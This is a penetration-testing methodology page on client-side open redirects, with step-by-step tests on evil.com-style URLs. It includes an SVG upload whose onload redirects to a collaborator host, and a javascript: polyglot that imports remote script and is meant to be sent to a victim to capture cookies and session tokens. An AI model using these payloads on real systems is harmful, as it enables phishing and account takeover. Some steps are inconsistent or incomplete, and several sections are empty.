# Client Side URL Redirect

## Check List

## Methodology

### Black Box

#### [Redirection via /logout](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect#redirect-methods) <a href="#b309" id="b309"></a>

{% stepper %}
{% step %}
Open the target application
{% endstep %}

{% step %}
Login using your email and password
{% endstep %}

{% step %}
Verify your mobile OTP
{% endstep %}

{% step %}
You will be redirected to `https://example.com/?landing_uri=example.com`
{% endstep %}

{% step %}
Now modify the URL `https://example.com/logout?redirect_uri=https://evil.com`
{% endstep %}

{% step %}
Upon visiting this URL, you will be `redirected to` without any validation or warning
{% endstep %}
{% endstepper %}

***

#### [Open Redirect via Duplicate parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect#common-query-parameters)

{% stepper %}
{% step %}
Log in to the target site and complete the registration process
{% endstep %}

{% step %}
Then use the Burp suite tool to trace the requests and check if you see a parameter called م`continue=` or `next=` that has a url value Like the request below

```url
https://myaccount.example.com/security-checkup/1?continue=https://accounts.examplew.com/...
```
{% endstep %}

{% step %}
Copy the full original URL and append your payload as a second `continue=` parameter

```url
https://myaccount.example.com/security-checkup/1?continue=https://myaccount.example.com/security-checkup/1?continue=https://evil.com
```
{% endstep %}

{% step %}
Open the crafted URL while logged in
{% endstep %}

{% step %}
Click the "Continue" button (or any button that triggers the redirect)
{% endstep %}

{% step %}
If you land on `https://evil.com`, Open Redirect via parameter chaining confirmed
{% endstep %}
{% endstepper %}

***

#### Open Redirect Via Image Upload

{% stepper %}
{% step %}
Go to any profile picture, avatar, logo, or image upload feature on the target
{% endstep %}

{% step %}
Create this exact SVG file locally (save as redirect.svg)

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='http://0vwsb0oeappr3l1za7as1agllcr3fy3n.oastify.com'" xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="red"/>
</svg>
```
{% endstep %}

{% step %}
Go back to the upload feature and upload `redirect.svg` as your new profile `picture/avatar`
{% endstep %}

{% step %}
Intercept the upload POST request with Burp Suite
{% endstep %}

{% step %}
If needed, change Content-Type to `image/svg+xml` or remove it entirely
{% endstep %}

{% step %}
Complete the upload
{% endstep %}

{% step %}
So now go to Collaborator in burp suite and check if a request has been sent or open your profile page or anyone else’s profile who can view your avatar, If you are instantly redirected to `https://evil.com`, Open Redirect via SVG Avatar confirmed
{% endstep %}
{% endstepper %}

***

#### [Account Takeover](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect#filter-bypass)

{% stepper %}
{% step %}
Go to the login page or any `sign-in/auth page` and look for redirect parameters
{% endstep %}

{% step %}
Test basic open redirect first

```url
https://target.com/auth/signin?redirect=https://evil.com
```
{% endstep %}

{% step %}
If you land on `evil.com` after login, Open Redirect confirmed and Now escalate to XSS

```url
https://target.com/auth/signin?redirect=javascript:alert(1)
```
{% endstep %}

{% step %}
If alert pops after clicking “Sign in”, Direct JavaScript execution confirmed
{% endstep %}

{% step %}
If it’s filtered, use this universal bypass payload

```url
https://target.com/auth/signin?redirect=javascript://%250Aalert(1)
```

or

```
https://target.com/auth/signin?redirect=JavaScript://%250A/*?%27/*\%27/*%22/*\%22/*`/*\`/*%26apos;)/*%3C!--%3E%3C/Title/%3C/Style/%3C/Script/%3C/textArea/%3C/iFrame/%3C/noScript%3E\74k%3CK/contentEditable/autoFocus/OnFocus=/${/*/;{/**/(import(/https:\\burpcollab.net/.source))}}//\76--%3E
```
{% endstep %}

{% step %}
Send this exact link to the victim like

```
https://target.com/auth/signin?redirect=JavaScript://%250A/*?%27/*\%27/*%22/*\%22/*`/*\`/*%26apos;)/*%3C!--%3E%3C/Title/%3C/Style/%3C/Script/%3C/textArea/%3C/iFrame/%3C/noScript%3E\74k%3CK/contentEditable/autoFocus/OnFocus=/${/*/;{/**/(import(/https:\\burpcollab.net/.source))}}//\76--%3E
```
{% endstep %}

{% step %}
Victim clicks logs in gets silently redirected your server receives full cookies localStorage session tokens, Account Takeover achieved
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
